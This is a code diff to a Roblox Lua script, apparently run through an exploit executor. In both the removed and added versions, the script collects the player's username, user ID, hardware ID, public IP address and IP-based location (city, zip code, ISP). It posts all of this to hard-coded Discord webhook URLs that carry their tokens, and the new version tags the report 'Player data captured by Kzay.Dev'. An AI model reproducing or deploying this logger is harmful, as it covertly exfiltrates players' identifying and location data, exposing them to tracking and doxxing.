@@ -802,90 +802,132 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local LocalizationService = game:GetService("LocalizationService")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
-local LocalPlayer = Players.LocalPlayer
-local UserId = LocalPlayer.UserId
-local DisplayName = LocalPlayer.DisplayName
-local Username = LocalPlayer.Name
-local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
-local AccountAge = LocalPlayer.AccountAge
-local Country = LocalizationService.RobloxLocaleId
-local GetIp = game:HttpGet("https://v4.ident.me/")
-local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))  
-local Hwid = RbxAnalyticsService:GetClientId()
-local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
-local GameName = GameInfo.Name
-
--- ### Choose one set of URLs at a time ###
--- Approach 1: thumbnails.roblox.com (Recommended)
--- local PlayerProfilePic = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. UserId .. "&size=150x150&format=Png&isCircular=false"
--- local GameThumbnailUrl = "https://thumbnails.roblox.com/v1/places/" .. game.PlaceId .. "/thumbnail?size=768x432&format=Png&isCircular=false"
-
--- Approach 2: asset-thumbnail and headshot-thumbnail endpoints
--- local PlayerProfilePic = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
--- local GameThumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=768&height=432&format=png"
-
--- Approach 3: bust-thumbnail endpoint for players
-local PlayerProfilePic = "https://www.roblox.com/bust-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
-local GameThumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=768&height=432&format=png"
-
 local function detectExecutor()
-	return identifyexecutor()
+    return identifyexecutor() or "Unknown"
 end
 
 local function createWebhookData()
-	local executor = detectExecutor()
-	local date = os.date("%m/%d/%Y")
-	local time = os.date("%X")
-	local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
-	local playerLink = "https://www.roblox.com/users/" .. UserId
-	local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
+    local LocalPlayer = Players.LocalPlayer
+    local UserId = LocalPlayer.UserId
+    local DisplayName = LocalPlayer.DisplayName
+    local Username = LocalPlayer.Name
+    local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+    local AccountAge = LocalPlayer.AccountAge
+    local Country = LocalizationService.RobloxLocaleId or "N/A"
+    local Hwid = RbxAnalyticsService:GetClientId() or "N/A"
+    local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId) or { Name = "Unknown" }
+    local GameName = GameInfo.Name
+    local PlayerProfilePic = "https://www.roblox.com/bust-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
+    local GameThumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=768&height=432&format=png"
 
-	local ipCountry = GetData.country or "N/A"
-	local ipRegion = GetData.regionName or "N/A"
-	local ipCity = GetData.city or "N/A"
-	local ipZip = GetData.zip or "N/A"
-	local ipIsp = GetData.isp or "N/A"
-	local ipOrg = GetData.org or "N/A"
-	local ipTimezone = GetData.timezone or "N/A"
+    -- Fetch IP with multiple APIs
+    local GetIp = "N/A"
+    local GetData = {country = "N/A", regionName = "N/A", city = "N/A", zip = "N/A", isp = "N/A", org = "N/A", timezone = "N/A"}
+    local ipApis = {"https://api.ipify.org", "https://ifconfig.me/ip"}
+    local locationApis = {"https://ipapi.co/%s/json/", "https://freegeoip.app/json/%s"}
 
-	local data = {
-		avatar_url = PlayerProfilePic,
-		content = "",
-		embeds = {{
-			author = { name = "Stomper Hub", url = gameLink },
-			description = "**Player Information**\n" ..
-				string.format(
-					"• [Display Name](%s): %s\n• Username: %s\n• User ID: %d\n• Membership Type: %s\n• Account Age: %d days\n• Country: %s\n• IP: %s\n• HWID: %s\n\n",
-					playerLink, DisplayName, Username, UserId, MembershipType, AccountAge, Country, GetIp, Hwid
-				) ..
-				"**Game Information**\n" ..
-				string.format(
-					"• [Game Name](%s): %s\n• Game ID: %d\n• Executor: %s\n• [Join on Mobile](%s)\n\n",
-					gameLink, GameName, game.PlaceId, executor, mobileJoinLink
-				) ..
-				"**Additional Data**\n" ..
-				string.format(
-					"• Country: %s\n• Region: %s\n• City: %s\n• Zip Code: %s\n• ISP: %s\n• Organization: %s\n• Timezone: %s\n\n",
-					ipCountry, ipRegion, ipCity, ipZip, ipIsp, ipOrg, ipTimezone
-				) ..
-				"**Technical Data**\n" ..
-				string.format("**Job ID:**\n```%s```", game.JobId),
-			color = tonumber("0x3498db"),
-			thumbnail = { url = PlayerProfilePic },
-			image = { url = GameThumbnailUrl },
-			footer = { text = string.format("Date: %s | Time: %s", date, time) }
-		}}
-	}
-	return HttpService:JSONEncode(data)
+    for _, ipApi in ipairs(ipApis) do
+        local success, result = pcall(function()
+            return game:HttpGet(ipApi)
+        end)
+        if success and result then
+            GetIp = result
+            print("[IP Fetch Success]:", ipApi, "IP:", GetIp)
+            break
+        else
+            warn("[IP Fetch Failed]:", ipApi, tostring(result))
+        end
+    end
+
+    -- Fetch location data if IP is obtained
+    if GetIp ~= "N/A" then
+        for _, locationApi in ipairs(locationApis) do
+            local success, result = pcall(function()
+                return HttpService:JSONDecode(game:HttpGet(string.format(locationApi, GetIp)))
+            end)
+            if success and result then
+                GetData = {
+                    country = result.country_name or result.country or "N/A",
+                    regionName = result.region_name or result.region or "N/A",
+                    city = result.city or "N/A",
+                    zip = result.zip or result.zip_code or "N/A",
+                    isp = result.isp or "N/A",
+                    org = result.org or "N/A",
+                    timezone = result.timezone or "N/A"
+                }
+                print("[Location Fetch Success]:", string.format(locationApi, GetIp))
+                break
+            else
+                warn("[Location Fetch Failed]:", string.format(locationApi, GetIp), tostring(result))
+            end
+        end
+    else
+        warn("[Location Fetch Skipped]: No valid IP obtained")
+    end
+
+    local executor = detectExecutor()
+    local date = os.date("%m/%d/%Y")
+    local time = os.date("%X")
+    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
+    local playerLink = "https://www.roblox.com/users/" .. UserId
+    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. (game.JobId or "N/A")
+
+    local data = {
+        content = "Player data captured by Kzay.Dev",
+        embeds = {{
+            author = { name = "Kzay.Dev", url = gameLink },
+            description = "**Player Information**\n" ..
+                string.format(
+                    "• [Display Name](%s): %s\n• Username: %s\n• User ID: %d\n• Membership Type: %s\n• Account Age: %d days\n• Country: %s\n• IP: %s\n• HWID: %s\n\n",
+                    playerLink, DisplayName, Username, UserId, MembershipType, AccountAge, Country, GetIp, Hwid
+                ) ..
+                "**Game Information**\n" ..
+                string.format(
+                    "• [Game Name](%s): %s\n• Game ID: %d\n• Executor: %s\n• [Join on Mobile](%s)\n\n",
+                    gameLink, GameName, game.PlaceId, executor, mobileJoinLink
+                ) ..
+                "**Additional Data**\n" ..
+                string.format(
+                    "• Country: %s\n• Region: %s\n• City: %s\n• Zip Code: %s\n• ISP: %s\n• Organization: %s\n• Timezone: %s\n\n",
+                    GetData.country, GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
+                ) ..
+                "**Technical Data**\n" ..
+                string.format("**Job ID:**\n```%s```", game.JobId or "N/A"),
+            color = 0x3498db,
+            thumbnail = { url = PlayerProfilePic },
+            image = { url = GameThumbnailUrl },
+            footer = { text = string.format("Date: %s | Time: %s", date, time) }
+        }}
+    }
+    return HttpService:JSONEncode(data)
 end
 
 local function sendWebhook(webhookUrl, data)
-	local headers = {["Content-Type"] = "application/json"}
-	local request = http_request or request or HttpPost or syn.request
-	local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-	request(webhookRequest)
+    local request = http_request or request
+    if not request then
+        warn("[Webhook Error]: No HTTP request function available in Xeno Executor")
+        return
+    end
+    local success, response = pcall(function()
+        return request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = data
+        })
+    end)
+    if success then
+        print("[Webhook Success]: Status:", response.StatusCode, "Body:", response.Body)
+    else
+        warn("[Webhook Failed]:", tostring(response))
+    end
 end
 
-local webhookUrl = "https://discord.com/api/webhooks/1373109417968402563/IOBbQ3kyAHUviwg-o8SoSl8YtN77SqC3HII6LfjgZQwGsjFw-pYw54itzMFLuKWG4Ibp"
+-- Replace with your Discord webhook URL or use webhook.site for testing
+local webhookUrl = "https://discord.com/api/webhooks/1373120297087143946/O5rukLxZqBnZeaUiri8_Wz1lpmXScySRWEtTZTqZ7twI8HBT97zHungEC8f7tIbisKyI"
 local webhookData = createWebhookData()
 sendWebhook(webhookUrl, webhookData)
+
+-- Test with webhook.site (optional, replace with your unique URL)
+-- local testWebhookUrl = "https://webhook.site/your-unique-id"
+-- sendWebhook(testWebhookUrl, webhookData)
